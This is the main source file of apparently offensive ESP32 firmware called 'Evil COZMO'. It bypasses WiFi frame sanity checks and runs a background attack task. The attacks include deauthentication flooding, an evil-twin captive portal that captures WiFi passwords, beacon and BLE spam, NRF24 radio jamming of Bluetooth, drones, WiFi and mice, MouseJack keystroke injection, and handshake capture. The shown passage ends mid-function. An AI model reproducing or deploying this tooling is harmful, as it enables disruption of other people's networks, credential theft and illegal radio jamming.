/* Evil COZMO v10 - Modular Version */

#include <U8g2lib.h>
#include <Wire.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <SPI.h>
#include <RF24.h>
#include <nRF24L01.h>
#include <BluetoothSerial.h>
#include <Preferences.h>
#include <atomic>
#include <SD.h>
#include <FS.h>

#include "Config.h"
#include "DisplayBase.h"
#include "MenuSystem.h"
#include "WiFiLogic.h"
#include "MenuWiFi.h"
#include "MenuMarauder.h"
#include "MenuBLE.h"
#include "MenuNRF.h"

// ── Bypass Sanity Check (Linker Override) ─────────────────────
// These must be in the .ino file without 'inline' so the linker can
// find them to replace the default weak symbols in the WiFi stack.
extern "C" int ieee80211_raw_frame_sanity_check(void *arg1, void *arg2, void *arg3) { return 0; }
extern "C" int wifi_raw_frame_sanity_check(void *arg1, void *arg2, void *arg3) { return 0; }

// ── Global Objects ──────────────────────────────────────────────
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, I2C_SCL, I2C_SDA);
BluetoothSerial SerialBT;
Preferences preferences;
DNSServer dnsServer;
WebServer server(80);
SemaphoreHandle_t stringMutex = NULL;
bool sd_ok = false;

// Queue for moving packets from sniffer to SD Card task
struct PacketTaskData {
    uint8_t payload[256];
    uint16_t len;
};
QueueHandle_t pcapQueue;

// ── Marauder Engine Variables ─────────────────────────────────
std::atomic<long> pkts_total{0};
std::atomic<long> pkts_mgmt{0}; // Declared in Config.h
std::atomic<long> pkts_data{0}; // Declared in Config.h
std::atomic<long> pkts_ctrl{0};
std::atomic<long> pkts_prob{0}; // Probe packet counter definition
std::atomic<long> pkts_deauth_sent{0};
std::atomic<long> pkts_deauth_rx{0};
std::atomic<long> pkts_pmkid{0};
std::atomic<int> unique_aps{0};
uint8_t currentChannel = WIFI_CHANNEL_MIN;
unsigned long channelTimer = 0;

// ── NRF24 Objects ──────────────────────────────────────────────
SPIClass vspi(VSPI);
SPIClass hspi(HSPI);
RF24 radio(NRF_RADIO1_CE, NRF_RADIO1_CSN);
RF24 radio2(NRF_RADIO2_CE, NRF_RADIO2_CSN);
int nrfCursor = 0;
std::atomic<int> nrfJamMode{0};
std::atomic<bool> nrfRunning{false};
std::atomic<bool> radio1_ok{false};
std::atomic<bool> radio2_ok{false};
int nrfTargetCursor = 0;
std::atomic<long> blePacketCount{0};
uint8_t nrfSpectrum[128] = {0};
uint8_t mjTargetChannels[MAX_MJ_TARGETS] = {0};

std::atomic<int> captivePortalHits{0};
String capturedPassword = "";
String extenderSSID = "";
String extenderPassword = "";
std::atomic<bool> extenderActive{false};
std::atomic<int> beaconPortalHits{0};
String beaconCapturedPassword = "";
std::atomic<bool> beaconStarted{false};
std::atomic<bool> mouseJackActive{false};
uint8_t mjTargetAddresses[MAX_MJ_TARGETS][5] = {0};
std::atomic<int> mjTargetCount{0};
int mjChannel = 2;
int mjPayloadCursor = 0;
String mjStatus = "Scanning...";
// ── Sniffer Callback ──────────────────────────────────────────

// Helper function to write PCAP header for Wireshark analysis
void initPcapFile() {
    if (!sd_ok) return;
    if (!SD.exists("/capture.pcap")) {
        File f = SD.open("/capture.pcap", FILE_WRITE);
        if (f) {
            uint32_t magic = 0xa1b2c3d4;
            uint16_t version_major = 2;
            uint16_t version_minor = 4;
            int32_t  thiszone = 0;
            uint32_t sigfigs = 0;
            uint32_t snaplen = 65535;
            uint32_t network = 105; // 105 = IEEE 802.11
            f.write((uint8_t*)&magic, 4);
            f.write((uint8_t*)&version_major, 2);
            f.write((uint8_t*)&version_minor, 2);
            f.write((uint8_t*)&thiszone, 4);
            f.write((uint8_t*)&sigfigs, 4);
            f.write((uint8_t*)&snaplen, 4);
            f.write((uint8_t*)&network, 4);
            f.close();
        }
    }
}

void savePacketToPcap(uint8_t* buf, uint16_t len) {
    if (!sd_ok) return;
    File f = SD.open("/capture.pcap", FILE_APPEND);
    if (f) {
        uint32_t ts_sec = millis() / 1000;
        uint32_t ts_usec = (millis() % 1000) * 1000;
        f.write((uint8_t*)&ts_sec, 4);
        f.write((uint8_t*)&ts_usec, 4);
        f.write((uint8_t*)&len, 4); // Captured Len
        f.write((uint8_t*)&len, 4); // Original Len
        f.write(buf, len);
        f.close();
    }
}

void IRAM_ATTR sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  pkts_total++; 
  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *bssid = &pkt->payload[10]; // Standard BSSID offset
    
    static uint8_t known_aps[32][6];
    static int known_count = 0;
    bool found = false;
    for(int i=0; i<known_count; i++) {
      if(memcmp(known_aps[i], bssid, 6) == 0) { found = true; break; }
    }
    if(!found && known_count < 32) {
      memcpy(known_aps[known_count++], bssid, 6);
      unique_aps++;
    }
  }

  if (type == WIFI_PKT_MGMT) {
    pkts_mgmt++;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t frame_control = pkt->payload[0];
    uint8_t f_type = (frame_control >> 2) & 0x03;
    uint8_t f_subtype = (frame_control >> 4) & 0x0F;
    // If you intend to count beacon frames specifically, consider adding a 'pkts_beacon' counter.
    // Currently, 'pkts_mgmt' is already incremented for all management frames,
    // so this line would double-count beacon frames as management frames.
    // if (f_type == 0 && f_subtype == 8) pkts_mgmt++; // Removed to prevent double-counting of beacon frames
    if (f_type == 0 && f_subtype == 4) pkts_prob++; 
    if (f_type == 0 && f_subtype == 12) pkts_deauth_rx++;
  }
  else if (type == WIFI_PKT_DATA) {
    pkts_data++;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    // Check for EAPOL EtherType 0x888E at common offsets (Standard Data or QoS Data)
    if (pkt->rx_ctrl.sig_len >= 34 && ((pkt->payload[30] == 0x88 && pkt->payload[31] == 0x8E) || (pkt->payload[32] == 0x88 && pkt->payload[33] == 0x8E))) {
        pkts_pmkid++;
        // Send packet to Queue for writing in AttackTask (Core 0)
        if (sd_ok) {
            PacketTaskData taskData;
            taskData.len = (pkt->rx_ctrl.sig_len > 256) ? 256 : pkt->rx_ctrl.sig_len;
            memcpy(taskData.payload, pkt->payload, taskData.len);
            xQueueSendFromISR(pcapQueue, &taskData, NULL);
        }
    }
  }
  else if (type == WIFI_PKT_CTRL) pkts_ctrl++;
}

// ── UI State & Settings ───────────────────────────────────────
std::atomic<UiMode> currentUi{UI_MAIN};

// Navigation & WhatsApp Variables
String navInstruction = "";
String waSender = "";
String waMessage = "";
bool isShowingWA = false;

int menuCursor = 0;
int marauderCursor = 0;
int wifiJammerCursor = 0;
int evilTwinCursor = 0;
int beaconSpamCursor = 0;
int wifiScannerCursor = 0;
int selectedTarget = -1;
String lockedSSID = "";
uint8_t lockedBSSID[6]; // Store target BSSID here to avoid crash
std::atomic<int> targetChannel{1};
std::atomic<unsigned long> attackTimer{0};
String capturedUsername = "";
String webTemplate = "";
int currentRSSI = -100;
int rssiHistory[22] = {0}; 
int brightnessLevel = 2; 
std::atomic<int> wifiScanCount{-2}; // -2: Needs scan, -1: Scanning, >=0: Results
int wifiIndices[MAX_WIFI_LIST]; 
int channelLoad[14] = {0};
unsigned long marauderTimer = 0;
uint16_t deauthSeq = 0;

// Timers & State
unsigned long lastNavUpdate  = 0;
unsigned long lastWaUpdate   = 0;
unsigned long lastBtnPress   = 0;
unsigned long lastActiveTime = 0; 
unsigned long sleepStartTime = 0;
unsigned long lastDisplayUpdate = 0;
unsigned long selectHoldStartTime = 0;
bool isSleeping = false; 

// ══════════════════════════════════════════════════════════════
//  WAKE UP COZMO ROUTINE
// ══════════════════════════════════════════════════════════════
void wakeUpCozmo(unsigned long currentMillis) {
  if (isSleeping) {
    isSleeping = false;
    u8g2.setContrast(contrastValues[brightnessLevel]); 
    Serial.println("[SYSTEM] Woke up from sleep. Contrast restored.");
  }
  lastActiveTime = currentMillis;
}

// ── Helper: Cleanup Active Attack ──────────────────────────────
void stopActiveAttack() {
  UiMode ui = AtomicUtils::safe_load(currentUi);
  switch(ui) {
    case UI_MARAUDER_SNIFF:
      esp_wifi_set_promiscuous(false);
      Serial.println("[ATTACK] Marauder sniff stopped.");
      break;
    case UI_WIFI_SWEEP_RUN:
    case UI_WIFIJAMMER_RUN:
      esp_wifi_set_promiscuous(false);
      WiFi.scanDelete();
      Serial.println("[ATTACK] WiFi jammer stopped.");
      break;
    case UI_EVILTWIN_RUN:
      stopWiFiAttack();
      Serial.println("[ATTACK] Evil Twin stopped.");
      break;
    case UI_BEACON_SPAM_RUN:
      stopWiFiAttack();
      Serial.println("[ATTACK] Beacon spam stopped.");
      break;
    case UI_WIFI_EXTENDER:
      stopWiFiExtender();
      break;
    case UI_BLE_SPAM:
      {
        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
        if (pAdvertising != nullptr) {
          pAdvertising->stop();
      }
        delay(100);
        BLEDevice::deinit(false);
        delay(500);
        SerialBT.begin("EvilCozmo");
      }
      Serial.println("[ATTACK] BLE spam stopped.");
      break;
    case UI_NRF_RUN:
      AtomicUtils::safe_store(nrfRunning, false);
      radio.powerDown();
      radio2.powerDown();
      Serial.println("[ATTACK] NRF jamming stopped.");
      break;
    case UI_NRF_TARGET_SCAN:
    case UI_MOUSEJACK_RUN:
      AtomicUtils::safe_store(mouseJackActive, false);
      radio.powerDown();
      radio2.powerDown();
      Serial.println("[ATTACK] MouseJack stopped.");
      break;
    case UI_PMKID_CAPTURE:
      esp_wifi_set_promiscuous(false);
      Serial.println("[ATTACK] PMKID capture stopped.");
      break;
    case UI_WIFI_ANALYZER:
      esp_wifi_set_promiscuous(false);
      WiFi.scanDelete();
      Serial.println("[SYSTEM] WiFi analyzer stopped.");
      break;
    default:
      break;
  }
}

// ── Helper: Validate WiFi Cursor
inline bool isValidWiFiCursor(int cursor) {
  return cursor >= 0 && cursor < wifiScanCount;
}

// ── Centralized Input Handling ─────────────────────────────────
void handleNext() {
  unsigned long currentMillis = millis();
  if (isSleeping) {
    wakeUpCozmo(currentMillis);
    return;
  }
  lastActiveTime = currentMillis;
  if (currentUi == UI_MAIN) { currentUi = UI_MENU; menuCursor = 0; } 
  else if (currentUi == UI_MENU) { menuCursor = (menuCursor + 1) % MENU_ITEMS_COUNT; } 
  else if (currentUi == UI_MARAUDER_MENU) { marauderCursor = (marauderCursor + 1) % 4; } 
  else if (currentUi == UI_WIFIJAMMER_MENU && wifiScanCount > 0) { 
    wifiJammerCursor = (wifiJammerCursor + 1) % (wifiScanCount + 1);
  }
  else if (currentUi == UI_EVILTWIN_MENU && wifiScanCount > 0) { 
    if (isValidWiFiCursor(evilTwinCursor)) evilTwinCursor = (evilTwinCursor + 1) % wifiScanCount;
  }
    else if (currentUi == UI_BEACON_SPAM_MENU && wifiScanCount > 0) {
    if (isValidWiFiCursor(beaconSpamCursor)) beaconSpamCursor = (beaconSpamCursor + 1) % wifiScanCount;
  }
  else if (currentUi == UI_NRF_TARGET_SELECT && AtomicUtils::safe_load(mjTargetCount) > 0) {
    nrfTargetCursor = (nrfTargetCursor + 1) % AtomicUtils::safe_load(mjTargetCount);
  }
    else if (currentUi == UI_NRF_MENU) { nrfCursor = (nrfCursor + 1) % 9; } 
  else if (currentUi == UI_WIFI_SCAN && wifiScanCount > 0) { 
    if (isValidWiFiCursor(wifiScannerCursor)) wifiScannerCursor = (wifiScannerCursor + 1) % wifiScanCount;
  }
  else if (currentUi == UI_BRIGHTNESS) { 
    brightnessLevel = (brightnessLevel + 1) % 3; 
    u8g2.setContrast(contrastValues[brightnessLevel]);
    preferences.putUInt("brightness", brightnessLevel);
  }
  else if (currentUi == UI_MOUSEJACK_RUN) {
    if (AtomicUtils::safe_load(mjTargetCount) > 0) {
        mjPayloadCursor = (mjPayloadCursor + 1) % MJ_PAYLOAD_COUNT;
    } else {
        deinitRadios();
        currentUi = UI_MENU;
    }
  }
  else if (currentUi == UI_NRF_RUN) {
    stopActiveAttack();
    currentUi = UI_MENU;
  }
  else if (currentUi == UI_WIFI_SCAN || currentUi == UI_MARAUDER_SNIFF || currentUi == UI_WIFIJAMMER_RUN || 
           currentUi == UI_EVILTWIN_RUN || currentUi == UI_BEACON_SPAM_RUN || currentUi == UI_BLE_SPAM || 
           currentUi == UI_WIFI_SWEEP_RUN || currentUi == UI_WIFI_EXTENDER || currentUi == UI_WIFI_ANALYZER || 
           currentUi == UI_PMKID_CAPTURE) { 
    stopActiveAttack();
    currentUi = UI_MENU; 
  }
}

void handleSelect() {
  unsigned long currentMillis = millis();
  if (isSleeping) {
    wakeUpCozmo(currentMillis);
    return;
  }
  lastActiveTime = currentMillis;
  if (currentUi == UI_MENU) { 
    if (menuCursor == 0) { currentUi = UI_WIFI_SCAN; wifiScanCount = -2; wifiScannerCursor = 0; }
    else if (menuCursor == 1) { currentUi = UI_MARAUDER_MENU; marauderCursor = 0; }
    else if (menuCursor == 2) { currentUi = UI_WIFIJAMMER_MENU; wifiScanCount = -2; wifiJammerCursor = 0; }
    else if (menuCursor == 3) { currentUi = UI_EVILTWIN_MENU; wifiScanCount = -2; evilTwinCursor = 0; }
    else if (menuCursor == 4) { currentUi = UI_BEACON_SPAM_MENU; wifiScanCount = -2; beaconSpamCursor = 0; }
    else if (menuCursor == 5) { 
      SerialBT.end(); 
      delay(200);
      // Properly clean up BLE before re-initializing
      BLEDevice::deinit(false);
      delay(200);
      BLEDevice::init(""); 
      delay(200);
      BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
      if (pAdvertising != nullptr) {
        pAdvertising->setScanResponse(true);
        pAdvertising->setMinPreferred(0xA0);
        pAdvertising->setMaxPreferred(0xA0);
      }
      currentUi = UI_BLE_SPAM; 
    } 
    else if (menuCursor == 6) { currentUi = UI_NRF_MENU; nrfCursor = 0; }
    else if (menuCursor == 7) { 
      pkts_pmkid = 0;
      WiFi.mode(WIFI_STA);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      esp_wifi_set_promiscuous(true);
      currentUi = UI_PMKID_CAPTURE; 
    }
    else if (menuCursor == 8) { 
      currentUi = UI_WIFI_ANALYZER; 
      wifiScanCount = -2; 
    }
    else if (menuCursor == 9) {
      u8g2.clearBuffer(); u8g2.drawStr(20, 40, "INIT MOUSEJACK..."); u8g2.sendBuffer();
      initRadios(false); // Mode PACKET (isJammer = false)
      if (AtomicUtils::safe_load(radio1_ok) || AtomicUtils::safe_load(radio2_ok)) {
        mjStatus = "Scanning...";
        AtomicUtils::safe_store(mjTargetCount, 0);
        mjPayloadCursor = 0;
        AtomicUtils::safe_store(mouseJackActive, true);
        currentUi = UI_MOUSEJACK_RUN;
      } else {
        currentUi = UI_MENU;
      }
    }
      else if (menuCursor == 10) { 
        // Preserve SSID/Pass so Preferences can load
        currentUi = UI_WIFI_EXTENDER; 
      }
    else if (menuCursor == 11) currentUi = UI_BRIGHTNESS;
    else if (menuCursor == 12) ESP.restart();
    else if (menuCursor == 13) currentUi = UI_MAIN;
  } 
  else if (currentUi == UI_MARAUDER_MENU) {
    if (marauderCursor == 0) {
      // Packet Monitor Mode
      WiFi.mode(WIFI_STA);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      esp_wifi_set_promiscuous(true);
      currentUi = UI_MARAUDER_SNIFF;
    }
    else if (marauderCursor == 1) {
      // Deauth Detector Mode
      currentChannel = 1;
      WiFi.mode(WIFI_STA);
      esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
      esp_wifi_set_promiscuous(true);
      currentUi = UI_MARAUDER_SNIFF;
    }
    else if (marauderCursor == 2) {
      // Clear Stats
      pkts_total = 0; pkts_mgmt = 0; pkts_data = 0; pkts_ctrl = 0;
      pkts_prob = 0; pkts_deauth_sent = 0; pkts_deauth_rx = 0; unique_aps = 0;
      Serial.println("[MARAUDER] Statistics cleared.");
    }
    else currentUi = UI_MENU;
  }
  else if (currentUi == UI_WIFIJAMMER_MENU) {
    if (wifiJammerCursor == 0) {
      startWiFiSweep();
      currentUi = UI_WIFI_SWEEP_RUN;
    } else {
      selectedTarget = wifiJammerCursor - 1;
      if (selectedTarget < 0 || selectedTarget >= wifiScanCount) return;

      uint8_t* bssidPtr = WiFi.BSSID(wifiIndices[selectedTarget]);
      lockedSSID = WiFi.SSID(wifiIndices[selectedTarget]);
      if (bssidPtr != nullptr) {
        memcpy(lockedBSSID, bssidPtr, 6);
        targetChannel = WiFi.channel(wifiIndices[selectedTarget]);
        
        if (targetChannel < WIFI_CHANNEL_MIN) targetChannel = WIFI_CHANNEL_MIN;
        if (targetChannel > WIFI_CHANNEL_MAX) targetChannel = WIFI_CHANNEL_MAX;
        
        startWiFiJammer();
        attackTimer = millis(); // Reset timer on attack start
        deauthSeq = 0;
        currentRSSI = WiFi.RSSI(wifiIndices[selectedTarget]); 
        AtomicUtils::safe_store(pkts_deauth_sent, 0L);
        for(int i=0; i<RSSI_HISTORY_SIZE; i++) rssiHistory[i] = currentRSSI;
        currentUi = UI_WIFIJAMMER_RUN; 
      }
    }
  }
  else if (currentUi == UI_EVILTWIN_MENU) {
    if (!isValidWiFiCursor(evilTwinCursor)) {
      Serial.println("[TWIN] ERROR: Invalid cursor index!");
      return;
    }
    selectedTarget = evilTwinCursor;
    uint8_t* bssidPtr = WiFi.BSSID(wifiIndices[selectedTarget]);
    lockedSSID = WiFi.SSID(wifiIndices[selectedTarget]);
    if (bssidPtr != nullptr) {
      memcpy(lockedBSSID, bssidPtr, 6);
      targetChannel = WiFi.channel(wifiIndices[selectedTarget]);
      if (targetChannel < WIFI_CHANNEL_MIN) targetChannel = WIFI_CHANNEL_MIN;
      if (targetChannel > WIFI_CHANNEL_MAX) targetChannel = WIFI_CHANNEL_MAX;
      startEvilTwin(); 
      currentUi = UI_EVILTWIN_RUN; 
    }
  }
  else if (currentUi == UI_BEACON_SPAM_MENU) {
    if (!isValidWiFiCursor(beaconSpamCursor)) {
      Serial.println("[BEACON] ERROR: Invalid cursor index!");
      return;
    }
    selectedTarget = beaconSpamCursor;
    lockedSSID = WiFi.SSID(wifiIndices[selectedTarget]);
    if (lockedSSID.length() == 0) lockedSSID = "Unknown_Target";
    targetChannel = WiFi.channel(wifiIndices[selectedTarget]);
    if (targetChannel < WIFI_CHANNEL_MIN) targetChannel = WIFI_CHANNEL_MIN;
    if (targetChannel > WIFI_CHANNEL_MAX) targetChannel = WIFI_CHANNEL_MAX;
    startBeaconSpam(); 
    currentUi = UI_BEACON_SPAM_RUN; 
  }
  else if (currentUi == UI_NRF_MENU) {
    if (nrfCursor == 5) { // Target Jam
      u8g2.clearBuffer(); u8g2.drawStr(20, 40, "INIT NRF SCAN..."); u8g2.sendBuffer();
      initRadios(false); 
      if (AtomicUtils::safe_load(radio1_ok)) {
        AtomicUtils::safe_store(mjTargetCount, 0);
        AtomicUtils::safe_store(mouseJackActive, true);
        currentUi = UI_NRF_TARGET_SCAN;
      } else {
        currentUi = UI_MENU;
      }
    } else if (nrfCursor == 6 || nrfCursor == 7) { // Listen Mouse or Keyboard
      u8g2.clearBuffer(); u8g2.drawStr(10, 40, "START NRF LISTEN..."); u8g2.sendBuffer();
      initRadios(false); // Initialize radios in packet sniffing mode
      if (AtomicUtils::safe_load(radio1_ok)) {
        AtomicUtils::safe_store(mjTargetCount, 0);
        mjStatus = "Scanning...";
        mjChannel = 2; // Start from initial wireless mouse channel
        AtomicUtils::safe_store(mouseJackActive, true);
        currentUi = (nrfCursor == 6) ? UI_NRF_LISTEN_MOUSE : UI_NRF_LISTEN_KEYBOARD;
      } else {
        currentUi = UI_MENU;
      }
    } else if (nrfCursor == 8) { // Back
      currentUi = UI_MENU;
    }
    else if (nrfCursor < 6) {
      AtomicUtils::safe_store(nrfJamMode, nrfCursor);
      u8g2.clearBuffer(); u8g2.drawStr(20, 40, "INIT NRF24..."); u8g2.sendBuffer();
      
      Serial.printf("\n[NRF_INIT] Starting NRF24 jamming mode %d\n", AtomicUtils::safe_load(nrfJamMode));
      initRadios(true); // JAMMER mode (isJammer = true)
      delay(NRF_INIT_DELAY_MS);
      
      // Verify at least one radio works
      if (!radio1_ok && !radio2_ok) {
        Serial.println("[NRF_INIT] ERROR: No radios available! Returning to menu.");
        u8g2.clearBuffer(); u8g2.drawStr(10, 35, "No NRF24 detected!"); u8g2.drawStr(10, 50, "Check wiring."); u8g2.sendBuffer();
        delay(2000);
        currentUi = UI_NRF_MENU;
      } else {
        // Show status
        const char* modeNames[] = {"Bluetooth Jammer", "Drone Jammer", "WiFi Jammer", "Multi-Channel", "Mouse Jammer", "Target Jam"}; // Updated mode names
        Serial.printf("[NRF] Starting: %s\n", modeNames[nrfJamMode]);
        printNRFStatus();
        
        AtomicUtils::safe_store(nrfRunning, true);
        currentUi = UI_NRF_RUN;
      }
    } 
    }
    else if (currentUi == UI_NRF_TARGET_SCAN) {
      AtomicUtils::safe_store(mouseJackActive, false);
      if (AtomicUtils::safe_load(mjTargetCount) > 0) {
        nrfTargetCursor = 0;
        currentUi = UI_NRF_TARGET_SELECT;
      } else {
        currentUi = UI_NRF_MENU;
      }
    }
    else if (currentUi == UI_NRF_TARGET_SELECT) {
      int count = AtomicUtils::safe_load(mjTargetCount);
      if (count > 0 && nrfTargetCursor < count) {
        AtomicUtils::safe_store(targetChannel, (int)mjTargetChannels[nrfTargetCursor]);
        initRadios(true); // Re-init as Jammer
        AtomicUtils::safe_store(nrfRunning, true);
        currentUi = UI_NRF_RUN;
      } else {
        currentUi = UI_NRF_MENU;
      }
    }
    else if (currentUi == UI_MOUSEJACK_RUN) {
      // Rely on mjTargetCount as the decisive target metric
      if (AtomicUtils::safe_load(mjTargetCount) > 0) {
          executeSelectedPayload();
      } else {
          stopActiveAttack();
          currentUi = UI_MENU;
      }
    }
    else if (currentUi == UI_NRF_LISTEN_MOUSE || currentUi == UI_NRF_LISTEN_KEYBOARD) {
      // If target exists, press SELECT to rescan
      if (AtomicUtils::safe_load(mjTargetCount) > 0) {
        AtomicUtils::safe_store(mjTargetCount, 0);
        mjStatus = "Scanning...";
        Serial.println("[NRF_LISTEN] Resetting target, scanning again...");
      } else {
        // If scanning (count 0), SELECT exits to menu
        stopActiveAttack();
        currentUi = UI_MENU;
      }
    }
  else if (currentUi == UI_WIFI_EXTENDER) {
    if (extenderSSID != "") {
      startWiFiExtender();
    }
  }
  else if (currentUi == UI_BRIGHTNESS) currentUi = UI_MENU; 
  else if (currentUi == UI_WIFI_SCAN || currentUi == UI_MARAUDER_SNIFF || currentUi == UI_WIFIJAMMER_RUN || 
           currentUi == UI_EVILTWIN_RUN || currentUi == UI_BEACON_SPAM_RUN || currentUi == UI_BLE_SPAM || currentUi == UI_NRF_RUN ||
           currentUi == UI_NRF_LISTEN_MOUSE || currentUi == UI_NRF_LISTEN_KEYBOARD || currentUi == UI_WIFI_EXTENDER ||
           currentUi == UI_WIFI_ANALYZER || currentUi == UI_PMKID_CAPTURE || currentUi == UI_WIFI_SWEEP_RUN) { 
    stopActiveAttack();
    currentUi = UI_MENU; 
  }
}

// ══════════════════════════════════════════════════════════════
//  SETUP
// ══════════════════════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  stringMutex = xSemaphoreCreateMutex();
  pcapQueue = xQueueCreate(10, sizeof(PacketTaskData));

  // Initialize SD Card (Shared VSPI bus with NRF)
  // Deselect NRF Radio 1 and SD Card to prevent SPI bus contention
  pinMode(NRF_RADIO1_CSN, OUTPUT);
  digitalWrite(NRF_RADIO1_CSN, HIGH);
  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH);

  // Initialize VSPI bus pins explicitly before SD.begin
  vspi.begin(NRF_SPI1_SCK, NRF_SPI1_MISO, NRF_SPI1_MOSI, NRF_RADIO1_CSN);

  if (SD.begin(SD_CS, vspi)) {
      sd_ok = true;
      Serial.println("[SYSTEM] SD Card detected and initialized.");
      initPcapFile();
  } else {
      Serial.println("[SYSTEM] SD Card not found. Skipping storage feature.");
  }

  esp_log_level_set("wifi", ESP_LOG_NONE);
  
  WiFi.persistent(false); // Do not write WiFi config to Flash NVS
  WiFi.softAPdisconnect(true); // Terminate any lingering AP instances
  
  pinMode(BTN_NEXT, INPUT_PULLUP); 
  pinMode(BTN_SELECT, INPUT_PULLUP);

  // ── Core 0: Background Task Engine (WiFi Injection & Jamming) ──
  // Created once in setup to avoid duplicate worker tasks
  xTaskCreatePinnedToCore([](void *pvParameters) {
    while (true) {
      // Thread-safe UI state reading to prevent race conditions
      UiMode ui = AtomicUtils::safe_load(currentUi);
      
      if (ui == UI_WIFIJAMMER_RUN) {
        unsigned long lastAtk = AtomicUtils::safe_load(attackTimer);
        if (millis() - lastAtk > DEAUTH_SEND_INTERVAL) {
          // Send broadcast deauth
          uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
          sendDeauth(broadcast, lockedBSSID, 0x01);
          
          // Send targeted deauth to multiple pseudo-client MACs
          uint8_t target_client[6] = {0xFF, 0xFE, 0xFD, 0xFC, 0xFB, (uint8_t)(random(256))};
          sendDeauth(target_client, lockedBSSID, 0x01);
          
          AtomicUtils::safe_store(attackTimer, millis());
        }
      } else if (ui == UI_WIFI_SWEEP_RUN) {
        if (millis() - attackTimer > DEAUTH_SEND_INTERVAL) {
          wifiChannelSweep();
          AtomicUtils::safe_store(attackTimer, millis());
        }
      } else if (ui == UI_EVILTWIN_RUN) {
        dnsServer.processNextRequest();
        server.handleClient();
        if (millis() - attackTimer > EVILTWIN_DEAUTH_INT) {
          uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
          int ch = AtomicUtils::safe_load(targetChannel);
          esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
          sendDeauth(broadcast, lockedBSSID, 0x01);
          AtomicUtils::safe_store(attackTimer, millis());
        }
      } else if (ui == UI_BEACON_SPAM_RUN) {
        if (millis() - attackTimer > BEACON_SEND_INTERVAL) {
          esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
          sendBeacon(lockedSSID.c_str());
          AtomicUtils::safe_store(attackTimer, millis());
        }
      } else if (ui == UI_BLE_SPAM) {
        sendBleSpam();
      } else if (ui == UI_MARAUDER_SNIFF || ui == UI_PMKID_CAPTURE) {
        if (millis() - channelTimer > 300) {
          currentChannel = (currentChannel % WIFI_CHANNEL_MAX) + 1;
          esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
          channelTimer = millis();
        }
        
        // Consumer for PCAP Queue
        PacketTaskData pcapData;
        if (sd_ok && xQueueReceive(pcapQueue, &pcapData, 0) == pdTRUE) {
          // Log PMKID info here (safe outside ISR)
          Serial.print("[PCAP_SAVE] Writing packet, Len: "); Serial.println(pcapData.len);
          if (ui == UI_PMKID_CAPTURE) {
              xSemaphoreTake(stringMutex, portMAX_DELAY);
              Serial.print("[TARGET_SSID]: "); Serial.println(lockedSSID);
              xSemaphoreGive(stringMutex);
          }
          savePacketToPcap(pcapData.payload, pcapData.len);
        }
      } else if (AtomicUtils::safe_load(nrfRunning)) {
        int mode = AtomicUtils::safe_load(nrfJamMode);
        if (mode == 0) btJam();
        else if (mode == 1) droneJam();
        else if (mode == 2) wifiJam();
        else if (mode == 3) singleChannel();
        else if (mode == 4) mouseJam();
        else if (mode == 5) wifiJam(true); // Targeted WiFi
        else reactiveJam();
      } else if (AtomicUtils::safe_load(mouseJackActive)) {
        if (ui == UI_NRF_LISTEN_MOUSE) updateNRFListen(false);
        else if (ui == UI_NRF_LISTEN_KEYBOARD) updateNRFListen(true);
        else updateMouseJack();
      }
      vTaskDelay(pdMS_TO_TICKS(1));
    }
  }, "AttackTask", TASK_STACK_SIZE, NULL, TASK_PRIORITY, NULL, 0);

  preferences.begin("nrfbox", false);
  brightnessLevel = preferences.getUInt("brightness", 2);
  if (brightnessLevel > 2) brightnessLevel = 2;
  
  // Load WiFi Extender credentials
  xSemaphoreTake(stringMutex, portMAX_DELAY);
  extenderSSID = preferences.getString("ext_ssid", "");
  extenderPassword = preferences.getString("ext_pass", "");
  xSemaphoreGive(stringMutex);

  u8g2.setI2CAddress(0x78); u8g2.setBusClock(400000); u8g2.begin(); u8g2.setContrast(contrastValues[brightnessLevel]); 
  
  // Fast timeout (50ms) to maintain UI responsiveness
  SerialBT.begin("EvilCozmo");
  SerialBT.setTimeout(BT_TIMEOUT_MS); 

  // Fast Boot Animation
  for(int i=0; i<=100; i+=5) { drawBooting(i); delay(30); } // From MenuSystem.h

  lastActiveTime = millis(); 
  
  Serial.println("\n[SYSTEM] Evil Cozmo Ready!");
}

// ══════════════════════════════════════════════════════════════
//  MAIN LOOP & COMMAND PARSER
// ══════════════════════════════════════════════════════════════
void loop() {
  unsigned long currentMillis = millis();

  // 1. Parsing Data Input (Bluetooth & Serial Monitor) with bounds checking
  String inputData = "";
  if (SerialBT.available()) {
    inputData = SerialBT.readStringUntil('\n');
    if (inputData.length() > 4096) inputData = inputData.substring(0, 4096);  // Limit to 4096 for larger HTML templates
    Serial.print("[BT_RX]: ");
  } else if (Serial.available()) {
    inputData = Serial.readStringUntil('\n');
    if (inputData.length() > 4096) inputData = inputData.substring(0, 4096);
    Serial.print("[SERIAL_RX]: ");
  }

  if (inputData.length() > 0) {
    inputData.replace("\r", "");
    inputData.trim();
    Serial.println(inputData);
    yield();

    if (inputData.equalsIgnoreCase("NEXT")) {
      Serial.println("[SYSTEM] Command: NEXT");
      handleNext();
    }
    else if (inputData.equalsIgnoreCase("SELECT")) {
      Serial.println("[SYSTEM] Command: SELECT");
      handleSelect();
    }
    else if (inputData.startsWith("WA:")) {
      int secondColon = inputData.indexOf(':', 3);
